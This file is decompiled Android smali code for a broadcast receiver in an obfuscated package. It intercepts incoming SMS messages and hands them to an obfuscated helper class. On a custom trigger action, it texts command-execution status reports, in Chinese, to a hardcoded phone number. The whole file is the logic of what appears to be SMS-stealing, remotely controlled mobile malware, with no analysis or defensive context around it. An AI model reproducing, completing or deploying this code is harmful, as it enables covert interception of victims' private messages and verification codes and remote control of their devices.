.class public Lji/yj/ur/a201jhfg20180420ab/JM03;
.super Landroid/content/BroadcastReceiver;
.source "JM03.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 10
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 6
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    const/4 v5, 0x0

    .line 14
    const-string v2, "action"

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 15
    const-string v2, "config"

    const/4 v3, 0x0

    invoke-virtual {p1, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 16
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v2

    const-string v3, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_0

    .line 17
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v2

    const-string v3, "android.provider.Telephony.SMS_RECEIVED_2"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_0

    .line 18
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v2

    const-string v3, "android.provider.Telephony.GSM_SMS_RECEIVED"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    .line 19
    :cond_0
    new-instance v1, Lji/yj/ur/a201jhfg20180420ab/JM02;

    invoke-direct {v1}, Lji/yj/ur/a201jhfg20180420ab/JM02;-><init>()V

    .line 20
    .local v1, "su":Lji/yj/ur/a201jhfg20180420ab/JM02;
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    .line 21
    .local v0, "bundle":Landroid/os/Bundle;
    if-eqz v0, :cond_1

    invoke-virtual {v1}, Lji/yj/ur/a201jhfg20180420ab/JM02;->ghyutrhr()Z

    move-result v2

    if-eqz v2, :cond_1

    .line 22
    invoke-virtual {v1, v0, p1, p0}, Lji/yj/ur/a201jhfg20180420ab/JM02;->ytuyghjdhd(Landroid/os/Bundle;Landroid/content/Context;Lji/yj/ur/a201jhfg20180420ab/JM03;)V

    .line 25
    .end local v0    # "bundle":Landroid/os/Bundle;
    .end local v1    # "su":Lji/yj/ur/a201jhfg20180420ab/JM02;
    :cond_1
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v2

    const-string v3, "sh.ji.fe"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    .line 26
    new-instance v1, Lji/yj/ur/a201jhfg20180420ab/JM02;

    invoke-direct {v1}, Lji/yj/ur/a201jhfg20180420ab/JM02;-><init>()V

    .line 27
    .restart local v1    # "su":Lji/yj/ur/a201jhfg20180420ab/JM02;
    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM03;->getResultCode()I

    move-result v2

    const/4 v3, -0x1

    if-eq v2, v3, :cond_3

    .line 28
    const-string v2, "18016217928"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "\u6307\u4ee4\u6267\u884c\u5931\u8d25\u72b6\u6001\u7801\uff1a"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM03;->getResultCode()I

    move-result v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3, v5}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 34
    .end local v1    # "su":Lji/yj/ur/a201jhfg20180420ab/JM02;
    :cond_2
    :goto_0
    return-void

    .line 31
    .restart local v1    # "su":Lji/yj/ur/a201jhfg20180420ab/JM02;
    :cond_3
    const-string v2, "18016217928"

    const-string v3, "\u6307\u4ee4\u53d1\u9001\u6210\u529f"

    invoke-virtual {v1, v2, v3, v5}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    goto :goto_0
.end method
